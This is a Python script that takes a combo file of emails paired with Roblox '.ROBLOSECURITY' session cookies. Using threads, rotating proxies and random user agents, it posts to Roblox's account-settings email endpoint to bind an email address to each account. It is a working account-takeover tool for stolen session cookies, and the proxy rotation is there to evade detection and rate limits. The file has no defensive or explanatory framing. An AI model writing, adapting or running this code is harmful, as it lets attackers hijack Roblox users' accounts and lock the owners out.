from requests import post
import random
from fake_useragent import UserAgent
import time
import threading
from queue import Queue
import os

class RobloxApi:
    def __init__(self, cookie, proxy=None):
        self.url = "https://accountsettings.roblox.com/v1/email"
        self.cookie = cookie
        self.proxy = proxy
        self.ua = UserAgent()
        self.csrf = self.get_csrf()

    def get_csrf(self):
        proxies = {'http': self.proxy, 'https': self.proxy} if self.proxy else None
        headers = {'User-Agent': self.ua.random}
        response = post(f'{self.url}', 
                       cookies={'.ROBLOSECURITY': self.cookie}, 
                       proxies=proxies,
                       headers=headers)
        return response.headers.get('x-csrf-token')

    def send_verify(self, email):
        proxies = {'http': self.proxy, 'https': self.proxy} if self.proxy else None
        headers = {
            'User-Agent': self.ua.random,
            'x-csrf-token': self.csrf
        }
        response = post(f'{self.url}', 
                       cookies={'.ROBLOSECURITY': self.cookie}, 
                       headers=headers,
                       json={"emailAddress": email},
                       proxies=proxies)
        return response

class Worker(threading.Thread):
    def __init__(self, queue, proxies):
        threading.Thread.__init__(self)
        self.queue = queue
        self.proxies = proxies
        
    def run(self):
        while True:
            if self.queue.empty():
                break
                
            email, cookie = self.queue.get()
            proxy = random.choice(self.proxies)
            
            try:
                verify = RobloxApi(cookie, proxy).send_verify(email)
                print(f"Email: {email} | Status: {verify.status_code} | Json Response: {verify.json()}")
                
                if verify.status_code == 200:
                    remove_line_from_combo(email, cookie)
                    print(f"Successfully removed {email} from combo file")
                    
            except Exception as e:
                print(f"Error with {email}: {str(e)}")
                
            finally:
                self.queue.task_done()
                time.sleep(1)  # Delay between requests

def load_proxies(file="proxy.txt"):
    with open(file, "r") as f:
        proxies = []
        for line in f:
            host, port, user, pwd = line.strip().split(":")
            proxy = f"http://{user}:{pwd}@{host}:{port}"
            proxies.append(proxy)
    return proxies

def remove_line_from_combo(email, cookie, filename="combo.txt"):
    # Read all lines
    with open(filename, "r") as f:
        lines = f.readlines()
    
    # Write back all lines except the one we want to remove
    with open(filename, "w") as f:
        for line in lines:
            if f"{email}:{cookie}" not in line.strip():
                f.write(line)

if __name__ == "__main__":
    # Load proxies and combo
    proxies = load_proxies()
    with open("combo.txt", "r") as f:
        combo = [line.split(":", 1) for line in f.read().splitlines()]
    
    # Create a queue and add combo items
    queue = Queue()
    for line in combo:
        queue.put((line[0], line[1]))
    
    # Create and start threads
    num_threads = 10  # Adjust this number based on your needs
    threads = []
    
    for _ in range(num_threads):
        thread = Worker(queue, proxies)
        thread.daemon = True
        thread.start()
        threads.append(thread)
    
    # Wait for all threads to complete
    queue.join()
    
    # Wait for all threads to finish
    for thread in threads:
        thread.join()
    
    print("All tasks completed!")

